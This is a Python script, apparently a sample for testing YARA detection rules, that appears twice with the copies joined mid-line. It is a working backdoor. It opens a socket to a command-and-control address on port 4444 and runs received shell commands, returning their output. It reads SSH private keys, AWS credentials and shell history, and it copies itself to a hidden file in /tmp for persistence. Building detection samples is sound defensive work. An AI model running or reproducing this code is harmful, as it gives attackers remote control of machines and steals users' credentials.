
import subprocess
import os
import socket
import base64

def establish_c2_connection():
    """Establish connection to command and control server"""
    host = "192.168.1.100"
    port = 4444
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except:
        pass

def execute_command(cmd):
    """Execute shell commands from C2"""
    try:
        result = subprocess.check_output(cmd, shell=True)
        return result
    except:
        pass

def steal_credentials():
    """Steal credentials from system"""
    credentials = []
    home_dir = os.path.expanduser("~")
    cred_files = [".ssh/id_rsa", ".aws/credentials", ".bash_history"]

    for cf in cred_files:
        path = os.path.join(home_dir, cf)
        if os.path.exists(path):
            with open(path, 'r') as f:
                credentials.append(f.read())
    return credentials

def persist_malware():
    """Achieve persistence on system"""
    startup_dir = os.path.expanduser("~/.config/autostart")
    malware_path = "/tmp/.hidden_service"

    # Copy self to startup location
    with open(__file__, 'r') as f:
        malware_code = f.read()

    with open(malware_path, 'w') as f:
        f.write(malware_code)

if __name__ == "__main__":
    sock = establish_c2_connection()
    creds = steal_credentials()
    persist_malware()
    while True:
        try:
            cmd = sock.recv(1024).decode()
            result = execute_command(cmd)
            sock.send(result)
        except:
            break#!/usr/bin/env python3
# Suspicious Python script for testing YARA rules
import subprocess
import os
import socket
import base64

def establish_c2_connection():
    """Establish connection to command and control server"""
    host = "192.168.1.100"
    port = 4444
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except:
        pass

def execute_command(cmd):
    """Execute shell commands from C2"""
    try:
        result = subprocess.check_output(cmd, shell=True)
        return result
    except:
        pass

def steal_credentials():
    """Steal credentials from system"""
    credentials = []
    home_dir = os.path.expanduser("~")
    cred_files = [".ssh/id_rsa", ".aws/credentials", ".bash_history"]

    for cf in cred_files:
        path = os.path.join(home_dir, cf)
        if os.path.exists(path):
            with open(path, 'r') as f:
                credentials.append(f.read())
    return credentials

def persist_malware():
    """Achieve persistence on system"""
    startup_dir = os.path.expanduser("~/.config/autostart")
    malware_path = "/tmp/.hidden_service"

    # Copy self to startup location
    with open(__file__, 'r') as f:
        malware_code = f.read()

    with open(malware_path, 'w') as f:
        f.write(malware_code)

if __name__ == "__main__":
    sock = establish_c2_connection()
    creds = steal_credentials()
    persist_malware()
    while True:
        try:
            cmd = sock.recv(1024).decode()
            result = execute_command(cmd)
            sock.send(result)
        except:
            break